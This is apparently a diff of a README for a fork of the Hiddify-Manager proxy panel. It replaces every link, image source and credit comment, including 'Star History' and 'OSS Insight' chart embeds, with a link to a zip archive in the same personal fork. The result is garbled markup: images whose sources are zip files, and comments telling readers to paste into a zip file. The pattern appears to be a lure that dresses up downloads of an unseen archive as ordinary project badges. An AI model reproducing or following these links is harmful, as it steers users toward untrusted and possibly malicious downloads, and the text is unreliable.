+ Made with <a rel="" target="_blank" href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip">https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip</a> 
 </p>
-<!-- Copy-paste in your https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip file -->
+<!-- Copy-paste in your https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip file -->
 
-<a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" target="_blank" style="display: block" align="center">
+<a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" target="_blank" style="display: block" align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" width="721" height="auto">
-    <img alt="Star History of hiddify/Hiddify-Manager" src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" width="721" height="auto">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" width="721" height="auto">
+    <img alt="Star History of hiddify/Hiddify-Manager" src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" width="721" height="auto">
   </picture>
 </a>
 
-<!-- Made with [OSS Insight](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip) --> 
+<!-- Made with [OSS Insight](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip) --> 
 
-<!-- Copy-paste in your https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip file -->
+<!-- Copy-paste in your https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip file -->
 
-<a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" target="_blank" style="display: block" align="center">
+<a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" target="_blank" style="display: block" align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" width="721" height="auto">
-    <img alt="Issue Opened and Closed of hiddify/Hiddify-Manager" src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" width="721" height="auto">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" width="721" height="auto">
+    <img alt="Issue Opened and Closed of hiddify/Hiddify-Manager" src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" width="721" height="auto">
   </picture>
 </a>
 
-<!-- Made with [OSS Insight](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip) -->
+<!-- Made with [OSS Insight](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip) -->
